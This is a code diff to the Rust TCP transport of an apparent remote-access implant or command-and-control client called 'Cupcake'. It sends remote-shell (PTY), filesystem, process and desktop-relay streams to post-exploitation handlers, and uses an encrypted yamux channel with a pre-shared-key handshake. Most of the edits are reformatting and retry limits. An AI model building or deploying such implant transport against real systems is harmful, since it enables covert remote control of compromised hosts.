@@ -6,9 +6,7 @@ use crate::backoff::ExponentialBackoff;
 use crate::config::{get_aes_key, get_aes_key_base};
 use crate::crypto;
 use crate::error::{ClientError, Result};
-use crate::transport::session_crypto::{
-    seal_for_wire, traffic_key, FragReassembler, OpenResult,
-};
+use crate::transport::session_crypto::{seal_for_wire, traffic_key, FragReassembler, OpenResult};
 use crate::transport::Transport;
 use async_trait::async_trait;
 use std::io::Write;
@@ -41,7 +39,7 @@ impl TcpTransport {
             reassembler: FragReassembler::new(),
         }
     }
-    
+
     fn parse_url(&self) -> Result<(String, u16)> {
         let full_url = if !self.url.contains("://") {
             format!("tcp://{}", self.url)
@@ -54,10 +52,15 @@ impl TcpTransport {
         let addr = rest.split('/').next().unwrap_or(rest);
         let parts: Vec<&str> = addr.split(':').collect();
         if parts.len() != 2 {
-            return Err(ClientError::ConnectionError(format!("Invalid TCP address: {}", addr)));
+            return Err(ClientError::ConnectionError(format!(
+                "Invalid TCP address: {}",
+                addr
+            )));
         }
         let host = parts[0].to_string();
-        let port = parts[1].parse::<u16>().map_err(|e| ClientError::ConnectionError(e.to_string()))?;
+        let port = parts[1]
+            .parse::<u16>()
+            .map_err(|e| ClientError::ConnectionError(e.to_string()))?;
         Ok((host, port))
     }
 }
@@ -67,9 +70,17 @@ impl Transport for TcpTransport {
     async fn connect(&mut self) -> Result<()> {
         let (host, port) = self.parse_url()?;
         let addr = format!("{}:{}", host, port);
-        
+
+        // Bounded retries so outer fallback / backoff can run (was infinite loop).
+        const MAX_ATTEMPTS: u32 = 5;
+        let mut attempts = 0u32;
+
         loop {
-            crate::utils::db_print(&format!("Connecting to {}...", addr));
+            attempts += 1;
+            crate::utils::db_print(&format!(
+                "Connecting to {}... (attempt {}/{})",
+                addr, attempts, MAX_ATTEMPTS
+            ));
             match TcpStream::connect(&addr).await {
                 Ok(stream) => {
                     // 🛡️ [Hardening] Configure low-level socket options
@@ -78,38 +89,53 @@ impl Transport for TcpTransport {
                         let _ = socket.set_keepalive(true);
                         let _ = socket.set_tcp_nodelay(true);
                         let _ = socket.set_linger(Some(std::time::Duration::from_secs(2)));
-                        
+
                         // Re-wrap into tokio stream
                         let stream = match TcpStream::from_std(socket.into()) {
                             Ok(s) => s,
                             Err(_) => {
                                 crate::utils::db_print("[Cupcake] Failed to re-wrap TCP stream");
+                                if attempts >= MAX_ATTEMPTS {
+                                    return Err(ClientError::ConnectionError(
+                                        "tcp re-wrap failed after max attempts".into(),
+                                    ));
+                                }
+                                let delay = self.backoff.next_delay();
+                                sleep(delay).await;
                                 continue;
                             }
                         };
                         crate::utils::db_print("[Cupcake] TCP hardened socket ready.");
-                    
+
                         let mut yamux_config = Config::default();
                         // 缓冲区大小：16MB（足够大文件传输，但不会 OOM）
                         yamux_config.set_max_buffer_size(16 * 1024 * 1024);
                         yamux_config.set_receive_window(16 * 1024 * 1024);
                         yamux_config.set_window_update_mode(WindowUpdateMode::OnRead);
-                        
+
                         let compat_stream = stream.compat();
-                        let mut connection = Connection::new(compat_stream, yamux_config, Mode::Client);
+                        let mut connection =
+                            Connection::new(compat_stream, yamux_config, Mode::Client);
                         let mut control = connection.control();
 
                         // 🛠 全功能多路复用调度器 (带并发限制)
                         tokio::spawn(async move {
                             crate::utils::db_print("[Yamux] Connection driver started.");
                             // 限制并发流数量，防止资源耗尽
-                            let stream_semaphore = std::sync::Arc::new(tokio::sync::Semaphore::new(16));
+                            let stream_semaphore =
+                                std::sync::Arc::new(tokio::sync::Semaphore::new(16));
                             loop {
                                 match connection.next_stream().await {
                                     Ok(Some(stream)) => {
                                         let stream_id = stream.id();
-                                        crate::utils::db_print(&format!("[Yamux] New stream incoming. ID: {}", stream_id));
-                                        let permit = match stream_semaphore.clone().try_acquire_owned() {
+                                        crate::utils::db_print(&format!(
+                                            "[Yamux] New stream incoming. ID: {}",
+                                            stream_id
+                                        ));
+                                        let permit = match stream_semaphore
+                                            .clone()
+                                            .try_acquire_owned()
+                                        {
                                             Ok(p) => p,
                                             Err(_) => {
                                                 crate::utils::db_print(&format!("[Yamux] Stream {} rejected: max concurrency reached", stream_id));
@@ -119,15 +145,18 @@ impl Transport for TcpTransport {
                                         };
                                         tokio::spawn(async move {
                                             let _permit = permit; // Hold permit until task completes
-                                            use futures_util::AsyncReadExt as _; 
+                                            use futures_util::AsyncReadExt as _;
                                             let mut stream = stream;
                                             let mut type_buf = [0u8; 1];
-                                            if let Err(e) = stream.read_exact(&mut type_buf).await { 
+                                            if let Err(e) = stream.read_exact(&mut type_buf).await {
                                                 crate::utils::db_print(&format!("[Yamux] Failed to read stream type for ID {}: {}", stream_id, e));
-                                                return; 
+                                                return;
                                             }
-                                            
-                                            crate::utils::db_print(&format!("[Yamux] Stream {} Type: 0x{:02X}", stream_id, type_buf[0]));
+
+                                            crate::utils::db_print(&format!(
+                                                "[Yamux] Stream {} Type: 0x{:02X}",
+                                                stream_id, type_buf[0]
+                                            ));
                                             use crate::transport::stream_types::{
                                                 YAMUX_STREAM_DESKTOP, YAMUX_STREAM_FS,
                                                 YAMUX_STREAM_PROCESS, YAMUX_STREAM_PTY,
@@ -163,7 +192,9 @@ impl Transport for TcpTransport {
                                                 }
                                                 YAMUX_STREAM_FS => {
                                                     #[cfg(feature = "post-ex")]
-                                                    { crate::fs::handle_stream(stream).await; }
+                                                    {
+                                                        crate::fs::handle_stream(stream).await;
+                                                    }
                                                     #[cfg(not(feature = "post-ex"))]
                                                     {
                                                         use futures_util::AsyncWriteExt;
@@ -174,7 +205,9 @@ impl Transport for TcpTransport {
                                                 }
                                                 YAMUX_STREAM_PROCESS => {
                                                     #[cfg(feature = "post-ex")]
-                                                    { crate::process::handle_stream(stream).await; }
+                                                    {
+                                                        crate::process::handle_stream(stream).await;
+                                                    }
                                                     #[cfg(not(feature = "post-ex"))]
                                                     {
                                                         use futures_util::AsyncWriteExt;
@@ -184,44 +217,73 @@ impl Transport for TcpTransport {
                                                     }
                                                 }
                                                 YAMUX_STREAM_DESKTOP => {
-                                                    // Product: thin bridge → L2 mod_desktop if loaded.
+                                                    // RDP relay — requires L2 desktop module Loaded
                                                     #[cfg(feature = "module-loader")]
                                                     {
                                                         crate::transport::desktop_bridge::handle_stream(stream).await;
                                                     }
                                                     #[cfg(not(feature = "module-loader"))]
                                                     {
-                                                        crate::transport::desktop_reject::reject_desktop_stream(stream).await;
+                                                        use futures_util::AsyncWriteExt;
+                                                        let mut s = stream;
+                                                        let _ = s.write_all(&[0x00u8]).await;
+                                                        let _ = s.close().await;
                                                     }
                                                 }
-                                                _ => { crate::utils::db_print(&format!("[Yamux] Unknown type: 0x{:02X}", type_buf[0])); }
+                                                _ => {
+                                                    crate::utils::db_print(&format!(
+                                                        "[Yamux] Unknown type: 0x{:02X}",
+                                                        type_buf[0]
+                                                    ));
+                                                }
                                             }
                                         });
                                     }
                                     Ok(None) => {
-                                        crate::utils::db_print("[Yamux] Connection driver reached EOF.");
+                                        crate::utils::db_print(
+                                            "[Yamux] Connection driver reached EOF.",
+                                        );
                                         break;
                                     }
                                     Err(e) => {
-                                        crate::utils::db_print(&format!("[Yamux] Connection driver error: {}", e));
+                                        crate::utils::db_print(&format!(
+                                            "[Yamux] Connection driver error: {}",
+                                            e
+                                        ));
                                         break;
                                     }
                                 }
                             }
                         });
 
-                        let control_stream = match tokio::time::timeout(std::time::Duration::from_secs(10), control.open_stream()).await {
+                        let control_stream = match tokio::time::timeout(
+                            std::time::Duration::from_secs(10),
+                            control.open_stream(),
+                        )
+                        .await
+                        {
                             Ok(Ok(s)) => s,
-                            _ => return Err(ClientError::ConnectionError("Yamux control failed".into())),
+                            _ => {
+                                return Err(ClientError::ConnectionError(
+                                    "Yamux control failed".into(),
+                                ))
+                            }
                         };
-                        
+
                         crate::utils::db_print("[Cupcake] Control established.");
                         self.control_stream = Some(control_stream.compat());
                         self.noise_session_key = None;
                         self.reassembler.clear();
 
-                        // X25519 with BASE key as PSK (matches server resolveAESKey — no salt)
-                        if !self.noise_psk.is_empty() {
+                        // X25519 with BASE key as PSK (matches server resolveAESKey — no salt).
+                        // A missing PSK is a hard failure: production never continues
+                        // without an authenticated session key.
+                        if self.noise_psk.is_empty() {
+                            return Err(ClientError::ConnectionError(
+                                "Noise PSK missing — refusing to establish unauthenticated session".into(),
+                            ));
+                        }
+                        {
                             let (ephemeral_key, handshake_msg) =
                                 crypto::noise_initiate(&self.noise_psk).map_err(|e| {
                                     ClientError::ConnectionError(format!("Noise init: {e}"))
@@ -277,19 +339,33 @@ impl Transport for TcpTransport {
                         return Ok(());
                     } else {
                         crate::utils::db_print("[Cupcake] Socket hardening failed, retrying...");
+                        if attempts >= MAX_ATTEMPTS {
+                            return Err(ClientError::ConnectionError(
+                                "tcp socket harden failed after max attempts".into(),
+                            ));
+                        }
                         let delay = self.backoff.next_delay();
                         sleep(delay).await;
                     }
                 }
                 Err(e) => {
+                    if attempts >= MAX_ATTEMPTS {
+                        return Err(ClientError::ConnectionError(format!(
+                            "tcp connect failed after {} attempts: {}",
+                            MAX_ATTEMPTS, e
+                        )));
+                    }
                     let delay = self.backoff.next_delay();
-                    crate::utils::db_print(&format!("Retry in {:?}: {}", delay, e));
+                    crate::utils::db_print(&format!(
+                        "Retry in {:?} ({}/{}): {}",
+                        delay, attempts, MAX_ATTEMPTS, e
+                    ));
                     sleep(delay).await;
                 }
             }
         }
     }
-    
+
     async fn send(&mut self, data: &[u8]) -> Result<()> {
         let key = traffic_key(self.noise_session_key.as_ref(), &self.aes_key)?.to_vec();
         let frames = seal_for_wire(data, &key, 0)?;
@@ -322,20 +398,18 @@ impl Transport for TcpTransport {
                 .as_mut()
                 .ok_or_else(|| ClientError::ConnectionError("No stream".into()))?;
 
-            let len = match tokio::time::timeout(
-                std::time::Duration::from_secs(120),
-                stream.read_u32(),
-            )
-            .await
-            {
-                Ok(Ok(l)) => l as usize,
-                Ok(Err(e)) => return Err(ClientError::ConnectionError(e.to_string())),
-                Err(_) => {
-                    return Err(ClientError::ConnectionError(
-                        "Read timeout (half-open)".into(),
-                    ))
-                }
-            };
+            let len =
+                match tokio::time::timeout(std::time::Duration::from_secs(120), stream.read_u32())
+                    .await
+                {
+                    Ok(Ok(l)) => l as usize,
+                    Ok(Err(e)) => return Err(ClientError::ConnectionError(e.to_string())),
+                    Err(_) => {
+                        return Err(ClientError::ConnectionError(
+                            "Read timeout (half-open)".into(),
+                        ))
+                    }
+                };
 
             if len > 100 * 1024 * 1024 {
                 return Err(ClientError::ConnectionError("Too big".into()));
@@ -352,7 +426,9 @@ impl Transport for TcpTransport {
             }
         }
     }
-    
-    fn is_connected(&self) -> bool { self.control_stream.is_some() }
+
+    fn is_connected(&self) -> bool {
+        self.control_stream.is_some()
+    }
     fn initialize(&mut self, _id: &str) {}
 }
